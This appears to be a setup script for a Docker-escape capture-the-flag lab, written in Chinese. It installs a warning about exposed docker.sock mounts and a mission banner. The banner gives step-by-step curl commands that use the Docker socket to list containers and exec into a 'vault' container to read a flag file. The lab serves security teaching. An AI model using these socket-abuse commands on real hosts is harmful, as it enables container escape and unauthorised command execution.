#!/bin/bash
set -e

# 教育說明
mkdir -p /home/player/education
cat > /home/player/education/security_warning.txt << 'TXT'
=== Docker Socket 安全警告（重要！）===

/var/run/docker.sock 是 Docker daemon 的 Unix socket。
任何有讀寫權限的使用者或容器都可以：

  1. 列出、停止、刪除所有容器
  2. 建立新容器並掛載 host 檔案系統
  3. 從任何容器讀取 host 上的任何檔案
  4. 完全控制 Docker daemon

這是一個非常嚴重的安全漏洞！

常見錯誤：
  ❌ -v /var/run/docker.sock:/var/run/docker.sock  （不加限制）
  ✅ -v /var/run/docker.sock:/var/run/docker.sock:ro  （唯讀，但仍危險！）

更安全的做法：
  1. 使用 rootless Docker（Docker 以非 root 身份執行）
  2. 使用 Docker socket proxy（限制 API 存取範圍）
  3. 避免任何容器掛載 docker.sock

參考：
  https://docs.docker.com/engine/security/rootless/
TXT

cat > /etc/motd << 'MOTD'

  ╔═══════════════════════════════════════════════════╗
  ║   💀  ESCAPE DOCKER  —  FINAL BOSS: The Escape    ║
  ╚═══════════════════════════════════════════════════╝

  你已經到達最後一關。

  ls /var/run/    # 有什麼東西？

  提示：Docker daemon 可以透過 Unix socket 控制。

  任務（三階段）：

    Stage 1：找到 docker.sock
      ls /var/run/docker.sock

    Stage 2：用 Docker API 列出所有容器
      curl --unix-socket /var/run/docker.sock \
           http://localhost/containers/json | python3 -m json.tool

    Stage 3：找到 vault 容器，執行指令讀取 FLAG
      curl --unix-socket /var/run/docker.sock \
           -X POST \
           "http://localhost/containers/vault/exec" \
           -H "Content-Type: application/json" \
           -d '{"Cmd":["cat","/final_flag.txt"],"AttachStdout":true}'
      # 取得 exec ID 後：
      curl --unix-socket /var/run/docker.sock \
           -X POST "http://localhost/exec/<ID>/start" \
           -H "Content-Type: application/json" \
           -d '{}'

  ⚠️ 完成後請閱讀：/home/player/education/security_warning.txt

MOTD

cat >> /home/player/.bashrc << 'BASHRC'
alias mission='cat /etc/motd'
echo "  輸入 'mission' 查看任務說明"
BASHRC
chown -R player:player /home/player
